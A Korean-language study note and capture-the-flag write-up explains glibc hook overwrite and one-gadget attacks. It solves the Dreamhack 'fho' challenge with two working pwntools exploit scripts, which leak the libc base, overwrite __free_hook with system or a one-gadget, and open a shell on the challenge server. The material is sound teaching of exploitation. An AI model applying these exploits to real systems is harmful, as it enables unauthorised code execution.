# **Hook(훅)** 이란 ?

컴퓨터 사이언스에서 OS가 어떤 코드를 실행하려고 할 때, 이를 낚아채어 다른 코드가 실행되게 하는 것을 **Hooking(후킹)** 이라고 하며, 이때 실행되는 코드를 **Hook(훅)** 이라고 한다.

## 용도

- 함수에 훅을 심어서 함수의 호출을 모니터링

- 함수에 추가적인 기능을 추가

- 아예 다른 코드를 심어서 실행 흐름 변조

## 예시

- `malloc` 이나 `free`에 훅을 설치하여, 소프트웨어에서 할당하고 해제하는 메모리를 모니터링 가능

- 함수 도입 부분에 훅으로 모니터링 함수를 설치하여 소프트웨어가 실행 중에 호출하는 함수를 모두 추적 가능

- 키보드 입력과 관련된 함수에 훅을 설치하여, 사용자가 입력하는 키를 모니터링 가능

# 1. Hook Overwrite

`Glibc 2.33` 이하 버전의 `libc` 데이터 영역에는 `malloc()`과 `free()`를 호출할 때, 함께 호출되는 `Hook`이 함수 포인터 형태로 존재함

`Full RELRO`가 적용되어도 데이터 영역은 **쓰기 권한이 존재** 하기 때문에, 해당 훅을 임의의 함수 주소로 **오버라이트(Overwrite)** 하여 악의적인 코드를 실행하도록 변조 가능

(따라서 실습 환경이 `Hook`이 존재하는 `Ubuntu 18.04 64-bit(Glibc 2.27)`로 `Dockerfile`을 작성하여 구축해야함)

`malloc`이나 `free` 함수가 다발적으로 호출되는 환경에서는 매우 공격에 취약하기 때문에 `Glibc 2.34` 버전부터 해당 훅은 제거되었음

## `malloc`, `free`, `realloc` 함수의 **Hook**

C에서 메모리의 동적 할당과 해제를 담당하는 위 함수들은 `libc.so`에 구현되어 있고, 이 함수들의 디버깅 편의를 위해 `Hook` 변수(`함수 포인터`)가 정의되어 있음

1. `malloc` 함수는 `__malloc_hook` 변수의 값이 `NULL`이 아닌지 검사하고, `NULL`이 아니라면 `malloc`을 수행하기 전에 `__malloc_hook`이 가리키는 함수를 먼저 실행함

2. 이때, `malloc` 함수의 인자는 `__malloc_hook`이 가리키는 함수의 `argument`로 전달되고, `__free_hook`, `__realloc_hook`도 같은 방식으로 작동함

```
// __malloc_hook
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook); // malloc hook read
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  // ...
}
```

## 훅의 위치와 권한

앞에서 설명했듯이, `훅`은 `libc.so`의 데이터 섹션에 존재하기 때문에 쓰기 권한이 남아있음. 따라서, 이 함수 포인터들은 악의적인 코드를 수행하는 함수를 가리키도록 `Overwrite`될 수 있음

```
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__malloc_hook|__free_hook|__realloc_hook"
   
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
  1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
```

위와 같이 각각의 훅의 `offset`이 첫째 열에 나온 값과 동일하고, (`0x3ed8e8`, `0x3ebc30`, `0x3ebc28`)

```
$ readelf -S /lib/x86_64-linux-gnu/libc-2.27.so | grep -EA 1 "\.bss|\.data"

<-- skipped -->
  [34] .data             PROGBITS         00000000003eb1a0  001eb1a0
       00000000000016c0  0000000000000000  WA       0     0     32
  [35] .bss              NOBITS           00000000003ec860  001ec860
       0000000000004280  0000000000000000  WA       0     0     32
```

`libc.so`의 `.bss` 영역과 `data` 영역을 살펴보면, 해당 훅들이 이 영여겡 존재하므로 쓰기가 가능하다는 것을 알 수 있음\
(첫번째 값이 `libc.so`에서의 `크기`, 마지막에서 2번째 값이 `libc.so`에서의 `시작 주소`, 마지막 값이 파일 내의 `offset`)

따라서, `__free_hook`은 `.bss` 영역, 나머지는 `data` 영역에 존재

## Hook Overwrite 공격 시나리오

- 앞에서 보았듯이 해당 훅들은 쓰기 권한이 존재하는 영역에 위치하기 때문에, 해당 값을 조작할 수 있음

- 그리고, 해당 훅을 호출하는 함수가 전달하는 인자를 그대로 받아감

위의 특성을 이용하여 `malloc`함수를 사용한 Hook Overwrite를 예로 들면, 

1. `__malloc_hook`을 `system` 함수의 주소로 `Overwrite`

2. `malloc("/bin/sh")`을 호출하도록 인자를 전달

이렇게 되면, `malloc("/bin/sh")`을 호출 할 때, `__malloc_hook` 가 `NULL`이 아니기 때문에 `__malloc_hook`이 가리키는 `system` 함수가 수행되며,

동시에 `"/bin/sh"` 이라는 인자가 전달되어 최종적으로 `system("/bin/sh")`이 실행되어 셸을 획득할 수 있게됨

# `fho` 워게임 풀이

```
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitrary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```
## 취약점 분석

1. 

```
puts("[1] Stack buffer overflow");
printf("Buf: ");
read(0, buf, 0x100);
printf("Buf: %s\n", buf);
```

해당 코드에서 `read(0, buf, 0x100);` 를 통해 아주 큰 **스택 버퍼 오버플로우** 가 발생함.

하지만 해당 바이너리에는 카나리가 적용되어 있는데, 카나리 값을 알아낼 방법이 없기 때문에 카나리를 덮어서 반환 주소를 Overwrite 하는 것은 불가능함

이 코드는 스택에 있는 데이터를 읽는 것에 사용할 수 있을 것임

2. 

```
puts("[2] Arbitrary-Address-Write");
printf("To write: ");
scanf("%llu", &addr);
printf("With: ");
scanf("%llu", &value);
printf("[%p] = %llu\n", addr, value);
*addr = value;
```

- 해당 코드에서 `unsigned long long *addr;` 와 `unsigned long long value;` 에 원하는 값을 대입할 수 있고, \
`*addr = value;` 을 통해 `addr` 이 가리키는 변수에 `value`를 대입할 수 있음

- 뒤에서 `free`를 호출하는데, 그럼 여기서 `addr`에 `__free_hook`의 주소를 대입하고, `value`에 `system`의 주소를 대입하면, `__free_hook`이 `system`을 가리키게 됨\
: `addr` -> `__free_hook`(=`*addr`) -> `system`(=`value`) : `__free_hook` 도 함수 포인터이기 때문에 `system`을 가리킬 수 있음

- `free`를 호출할 때, `__free_hook`이 `NULL`이 아니게 되므로 결국 `system`이 호출되게 되므로 이렇게 익스플로잇을 설계할 수 있음

3. 

```
puts("[3] Arbitrary-Address-Free");
printf("To free: ");
scanf("%llu", &addr);
free(addr);
```

해당 코드에서 `addr`에 원하는 값을 대입할 수 있고, `free(addr)`을 통해 `addr`을 인자로 설정하여 `free` 함수를 호출할 수 있음

위에서 `free`를 호출하면 `system`을 호출하도록 하였으니, 이번엔 `addr`에 `"/bin/sh"`을 가리키는 포인터의 주소를 대입하면 될 것임

### 공격 벡터 정리

1. 스택의 어떤 값을 읽을 수 있음

2. 임의 주소에 임의의 값을 쓸 수 있음

3. 임의 주소를 해제할 수 있음

## 공격 벡터 설계

### 1. `libc.so`에 존재하는 `변수` 및 `함수들의 주소` 구하기

아래의 주소들을 `libc.so`에서 구해야 함

- 첫 번째 `addr`에 대입할 `__free_hook` 변수의 주소

- `value`에 대입할 `system` 함수의 주소

- 두 번째 `addr`에 대입할 `"/bin/sh"` 문자열의 주소(`char *`가 가리키는 값의 주소)

`libc.so` 파일을 아래와 같이 분석하여 라이브러리 내에서 필요한 주소의 `offset`을 구할 수는 있지만,

바이너리가 메모리에 올라올 때 라이브러리의 주소가 랜덤화되기 때문에, 메모리에 매핑된 `libc`의 `base address`를 구해야 함

그런데 우리가 `read(0, buf, 0x100);` 를 통해 스택에서 큰 범위의 값을 읽을 수 있기 때문에 스택에 존재하는 `libc`의 주소를 읽을 수 있음

**그 이유는 `main` 함수는 `__libc_start_main` 이라는 라이브러리 함수에 의해 호출되기 때문에, `main` 함수의 스택 프레임에 존재하는 `return address`를 읽으면,**

그 주소를 읽을 수 있고, `libc_start_main` 의 주소를 통해 `libc`의 베이스 주소를 구할 수 있음

```
$ gdb ./fho
pwndbg> start
pwndbg> main
pwndbg> bt
#0  0x00005555555548be in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x5555555548ba <main>, argc=1, argv=0x7fffffffc338, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffc328) at ../csu/libc-start.c:310
#2  0x00005555555547da in _start ()
```

### 2. `libc`의 베이스 주소 구하는 방법

위에서 `main`은 라이브러리 함수인 `__libc_start_main`에 의해 호출된다고 하였기 때문에, `main` 함수의 스택 프레임에는 `__libc_start_main + x`로 돌아갈 반환 주소가 존재함

따라서, 반환 주소를 통해 `libc_start_main + x`의 주소를 구한 후 해당 코드의 `offset`을 구해 서로 빼주면, 마침내 `libc`의 **base 주소**를 구할 수 있음

다음과 같이 `main` 함수에 중단점을 설정한 후, **모든 스택 프레임의 백트레이스를 출력하는** `bt` 명령어를 통해, `main` 함수의 반환 주소를 알아낼 수 있음

```
$ gdb fho
pwndbg> b *main
Breakpoint 1 at 0x8ba
pwndbg> r
pwndbg> bt
#0  0x00005625b14008ba in main ()
#1  0x00007f5ae2f1cc87 in __libc_start_main (main=0x5625b14008ba <main>, argc=1, argv=0x7ffdf39f3ed8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffdf39f3ec8) at ../csu/libc-start.c:310
#2  0x00005625b14007da in _start ()
pwndbg> x/i 0x00007f5ae2f1cc87
   0x7f5ae2f1cc87 <__libc_start_main+231>:  mov    edi,eax
pwndbg>
```

위와 같이 `__libc_start_main+231`의 주소가 `0x7f5ae2f1cc87` 인 것을 확인할 수 있고, 아래를 통해 `__libc_start_main+231`의 `offset`을 구할 수 있음

```
$ readelf -s libc-2.27.so | grep " __libc_start_main@"
  2203: 0000000000021b10   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
```

여기서, `__libc_start_main+231`의 오프셋이 `0x21b10+231` 임을 구했기 때문에, **`libc`의 베이스 주소는 `main`의 반환 주소에서 `0x21b10+231`을 빼주면 되는 것을 알 수 있음**

이후, `__free_hook`, `system`, `"/bin/sh"`의 오프셋을 해당 베이스 주소에 더하면 각각이 메모리에 매핑된 주소까지 다 구해낼 수 있음

근데 실제로는 사용한 라이브러리에 따라 `libc_start_main + x`의 `x`가 바뀌기 때문에, `libc.libc_start_main_return`을 빼주는게 더욱 더 정확함

## 익스플로잇 코드 (주석 설명 잘 보기)

`canary` 변조 검사는 `main` 함수를 종료하기 직전에 하는데, 이번 문제에서는 `main` 함수를 종료하기 전에 이미 `free` 함수를 실행하여 쉘을 획득하므로 `canary` 값을 알아낼 필요 없이 `return address`까지 도달하기 위해 편하게 덮어써도 됨

---
바로 아래에 있는 스크린샷에서도 확인할 수 있지만, `rbp + 0x8`에 `main`의 `return address`인 `libc_start_main+x`가 존재하기 때문에, `buf`가 `rbp - 0x40`에 있는 것을 통해 `buf`에 `0x48`만큼 trash 값을 채워주면 `return address`를 알아낼 수 있음

`buf`에 `a\n`을 입력하고 난 후의 상태(`rbp-0x8`에 `canary`가 위치하고, `rbp+0x8`에 `libc_start_main+x`인 `return address`가 위치핢)

![image](https://github.com/user-attachments/assets/4e2fdf93-36c2-4629-b9b9-83af21fcef03)

---
`scanf`는 개행문자가 입력될 때 까지 입력을 받고 개행문자는 버려서 메모리에 입력되지 않지만, 

`read`는 개행문자와 상관없이 보낸 내용을 전부 메모리에 입력하기 때문에 `sendline()`으로 보내면 `\n`까지 입력되어 `0x48` 크기의 trash 값에 `0x0a`가 추가로 입력되서 `return address`의 첫 바이트가 손상됨

따라서, `scanf`는 `sendline()`으로, `read`는 `send()`로 보내야 하는거 잘 기억하기

---
64비트 주소 체계에서 하위 48비트만 쓰고 상위 16비트는 안쓰기 때문에 항상 상위 16비트(16진수 4자리)는 `\x00\x00`임

그래서 `p.recvn(8)`로 받으면, 마지막에 출력될 `\x00\x00` 은 널문자인데, `printf(%s)`는 널문자를 만나기 전까지 출력하기 때문에, 제대로 된 메모리 값을 받아올 수 없음

따라서, 항상 `(p.recvn(6) + b'\x00\x00')` 또는 개행문자를 제거한 `(p.recvline()[:-1] + b'\x00\x00')`으로 입력 받아야함\
(`printf`가 아닌 `write`여도 중간에 `\xaa\x00\xaa` 처럼 널문자를 만나면 출력 안하고 뛰어 넘어서 `\xaa\xaa`만 출력함)

그리고, 리틀 엔디언에서는 `%s`로 문자열을 출력할 때, 낮은 주소 먼저 출력되기 때문에 순서를 잘 생각해줘야함 (따라서, `\x00\x00`이 제일 마지막에 출력될 차례임, 널이라 출력안되긴 하지만)

`u64()`는 주소 계산을 위해 바이트 문자열을 정수로 변환하는데, 여기서도 string의 마지막이 높은 주소로 가기 때문에 잘 생각해줘서 `b'\x00\x00'`을 뒤에 붙여줘야함

---

`scanf`로 int형인 `%d`나 `%lld`를 받을 때에는, 문자열 그 자체를 정수로 해석하기 때문에 `str()`이나 `str().encode()`로 전달해줘야함

반면에 `scanf("%s")`, `read`, `gets`와 같은 경우 입력 받은 값을 문자열으로 해석하여 메모리에 입력하기 때문에 `p64()`로 패킹해서 전달해줘야함

그리고 `print(p64())`로 출력해보면 `b'\x00\x...'` 이렇게 출력되는데, 이건 사람이 읽을 수 있도록 문자열 리터럴로 표현된 것이고,

실제로 `p.send()`를 통해 전달 될 때는 해당 데이터를 64비트 리틀 엔디언 바이너리(이진) 데이터로 보내기 때문에 수신측에서 메모리에 16진수로 그대로 들어가게함

만약 정수 `12`를 `scanf(%d)`로 입력받으면 메모리에 `0xc`로 저장되겠지만, `scanf("%s")`, `read`, `gets`로 입력 받으면 메모리에 `0x3231`가 저장됨

따라서, 정수 `12(0xc)`를 `scanf("%d")`로 입력할 때는 `str().encode()`를 해줘야하고, `scanf("%s")`로 입력할 때는 `p64()`로 패킹해줘야함

---
byte string 쓰는 이유는, remote로 데이터를 보낼 때 기본적으로 시스템 콜은 바이트 데이터를 다루고, `null(0x00)`과 같은 문자는 string으로 표현할 수 없기 때문에, byte string으로 `b'\x00'` 으로 보내야 하기 때문임

```
from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 19416)
elf = ELF('./fho')
libc = ELF('./libc-2.27.so')

# [1] Leak libc base

# 1. buf의 위치 : rbp - 0x40
# 2. buf의 크기 : rbp - 0x30
# 3. canary의 위치 : rbp - 0x8
# 4. libc_start_main+x(return address)의 위치  : rbp + 0x8 (gdb를 통해 확인 가능)

# 따라서, rsp를 기준으로 0x48 = 0x30(buf 채워짐) + 0x8(쓰레기값?) + 0x8(canary 채워짐) + 0x8(rbp = sfp 채워짐) : 이렇게 되면 return_address를 가리킴
# canary의 변조는, main의 모든 수행을 마친 후 main이 완전히 끝나기 직전에 확인하는데, 여기서는 main이 끝나기 전에 이미 free를 호출하기 때문에 canary 변조 확인에 걸리지 않음
# 그래서, canary를 trash 값으로 채워도 상관없음

payload = b'a' * 0x48 
p.send(payload)
# sendline으로 보내면 '\n' = 0x0a 까지 보내져서, printf("%s") 로 payload 뒤를 못받기 때문에 이를 잘 생각해야함 
# 그리고 read는 scanf와 달리 sendline으로 개행문자를 기준으로 개행문자 전까지 받는게 아니라 입력된 send만큼만 받으니까 이 차이도 이해해야함

p.recvuntil(b'Buf: ' + payload)

# 1. 64비트 주소 체계에서 하위 48비트만 쓰고 상위 16비트는 안쓰기 때문에 항상 상위 16비트(16진수 4자리)는 '\x00\x00'임
# 2. p.recvn(8)로 받으면, 마지막에 출력될 \x00\x00 은 널문자인데, printf(%s)는 널문자를 만나기 전까지 출력하기 때문에, 
# 항상 (p.recvn(6) + b'\x00\x00') 또는 개행문자를 제거한 (p.recvline()[:-1] + b'\x00\x00')으로 해야함
# printf가 아닌 write여도 중간에 '\xaa\x00\xaa' 처럼 널문자를 만나면 출력 안하고 뛰어 넘어서 '\xaa\xaa'만 출력함
# 3. 리틀 엔디언에서는 %s로 문자열을 출력할 때, 낮은 주소 먼저 출력되기 때문에 순서를 잘 생각해줘야함 (따라서, \x00\x00이 제일 마지막에 출력될 차례임, 널이라 출력안되긴 하지만)
# 4. u64는 주소 계산을 위해 바이트 문자열을 정수로 변환하는데, 여기서도 string의 마지막이 높은 주소로 가기 때문에 잘 생각해줘서 b'\x00\x00'을 뒤에 붙여줘야함
libc_start_main_xx = u64(p.recvn(6) + b'\x00\x00') 

# 아래 방식은 마지막 '\n' 개행 문자 제거 후 붙임
# libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2) 

# libc_start_main+x 는 라이브러리 버전마다 다르기 때문에 libc.libc_start_main_return을 더해주면 일관성 있게 구할 수 있음
libc_base = libc_start_main_xx - libc.libc_start_main_return 

# [2] Overwrite `free_hook` with `system`

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh')) # libc에서 문자열을 검색하는 방법

# [3] Exploit

# scanf는 개행문자까지 받고, 개행문자를 버리기 때문에 send로 하면 안되고, 항상 sendline을 써야함
# scanf로 int형인 %d나 %lld를 받을 때에는, 문자열 그 자체를 정수로 해석하기 때문에 str()이나 str().encode()로 전달해줘야함
# 반면에 scanf("%s"), read, gets와 같은 경우 입력 받은 값을 문자열으로 해석하여 메모리에 입력하기 때문에 p64()로 패킹해서 전달해줘야함
# 그리고 print(p64())로 출력해보면 b'\x00\x...' 이렇게 출력되는데, 이건 사람이 읽을 수 있도록 문자열 리터럴로 표현된 것이고,
# 실제로 p.send()를 통해 전달 될 때는 해당 데이터를 64비트 리틀 엔디언 바이너리(이진) 데이터로 보내기 때문에 수신측에서 메모리에 16진수로 그대로 들어가게함
# 만약 정수 "12"를 scanf(%d)로 입력받으면 메모리에 "0xc"로 저장되겠지만, scanf("%s"), read, gets로 입력 받으면 메모리에 "0x3231"가 저장됨
# 따라서, 정수 "12(0xc)"를 scanf("%d")로 입력할 때는 str().encode()를 해줘야하고, scanf("%s")로 입력할 때는 p64()로 패킹해줘야함

# 1. 주소를 string으로 변환해서 전달함
p.sendline(str(free_hook))
p.sendline(str(system))
p.sendline(str(binsh))

# 2. 주소를 string으로 변환 후 byte string으로 다시 변환해서 전달함 (str(free_hook).encode는 encode 객체를 리턴하는거라서 아예 다른거니까 주의)
# byte string 쓰는 이유는, remote로 데이터를 보낼 때 기본적으로 시스템 콜은 바이트 데이터를 다루고, 
# string으로 표현할 수 없는 null 문자열의 경우, byte string으로 b'\x00' 으로 보내야 하기 때문이다.
# 이번 문제에서는 null 문자가 아닌 정수 그 자체를 보내는 것이기 때문에 필수적으로 encode()를 해주지 않아도 되지만, 항상 encode() 해주는 것이 좋다.
# p.sendline(str(free_hook).encode())
# p.sendline(str(system).encode())
# p.sendline(str(binsh).encode())

# 3. payload를 보낼때, 항상 send 관련 함수는 argument를 int가 아닌 string으로 받기 때문에 int 그 자체로는 절대 보낼 수 없음
# 따라서, 위의 두 예시처럼 string이나 byte string으로 변환해줘야함
# p.sendline(free_hook)
# p.sendline(system)
# p.sendline(binsh)

# 4. p64를 통해 정수를 8바이트 string으로 패킹하면, b'\x56\x34\x12\x00...' 와 같은 형식으로 보내지기 때문에 scanf(%d)로 '\x00'을 입력 받으면 값을 제대로 넣을 수 없음
# p64()는 read, gets, scanf("%s") 와 같이 문자열로 입력을 받을 때만 써야핢
# p.sendline(p64(free_hook))
# p.sendline(p64(system))
# p.sendline(p64(binsh))

# print를 해보면 차이를 잘 알 수 있음
print(p64(free_hook))
print(str(free_hook))
print(str(free_hook).encode())

p.interactive()

```

# 2. 원가젯(one-gadget)

기존에는 여러 개의 가젯을 조합해서 `ROP Chain`을 구성한 후 익스플로잇을 진행하지만, `libc`에는 하나의 단일 가젯만으로도 `Shell`을 실행할 수 있는 매우 강력한 `원가젯`이 존재함

해당 [링크](https://github.com/david942j/one_gadget)를 통해 HITCON, 217 CTF팀의 멤버인 david942j가 만든 `one_gadget` 도구를 사용할 수 있음

하지만, 이 원가젯은 `Glibc` 버전마다 다르게 존재하며, 사용하기 위한 제약 조건도 모두 다르기 때문에 (일반적으로 버전이 높을수록 제약 증가) 이를 파악하여 사전에 조건을 만족하도록 조작해주어야 함

### 장점

원가젯은 하나의 단일 가젯만으로도 쉘을 실행할 수 있다는 큰 장점이 존재함과 동시에, **함수에 인자를 전달하기 어려울 때 유용하게 활용될 수 있음**

예를 들어, 앞에서 Hook Overwrite를 통해 `__free_hook` 을 조작한 후 `free("/bin/sh")`을 호출해야 하는데, 

`free`에 작은 정수 밖에 입력할 수 밖에 없는 상황이라면, `"/bin/sh"` 이라는 문자열의 주소를 인자로 전달하는 것은 매우 어려움

따라서 이럴 때 제약 조건을 만족하는 원 가젯이 존재한다면, 이를 호출하여 바로 쉘을 획득할 수 있음 : **`constraints`가 제약 조건을 나타내는 부분**

```
$ one_gadget ./libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

## 원가젯을 활용한 익스플로잇 코드

원가젯을 만족하기 위해서는 레지스터 값이 조건을 만족해야 하는데, 현재 바이너리에서는 오프셋이 `0x4f432` 원가젯만 조건이 맞기 때문에 해당 원가젯을 사용할 수 있음

원가젯의 조건을 만족시키기 위해 레지스터 값을 수정하거나 변조해서 맞추는 방법도 있음

그리고, 원가젯을 `__free_hook` 에 대입하고 나면, 인자도 `"/bin/sh"`로 맞춰지기 때문에 `free`에 전달할 인자는 아무 값이나 넣어도 됨

```
#!/usr/bin/env python3
# Name: fho_og.py

from pwn import *

p = remote("host3.dreamhack.games", 8807)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - libc.libc_start_main_return
free_hook = libc_base + libc.symbols['__free_hook']
og = libc_base+0x4f432
# og = libc_base+0x4f3d5
# og = libc_base+0x10a41c

# [2] Overwrite `free_hook` with `og`, one-gadget address
p.sendline(str(free_hook).encode())
p.sendline(str(og).encode())
p.sendline(str(0x31337).encode()) # 0x31337은 그냥 밈 값임

p.interactive()
```
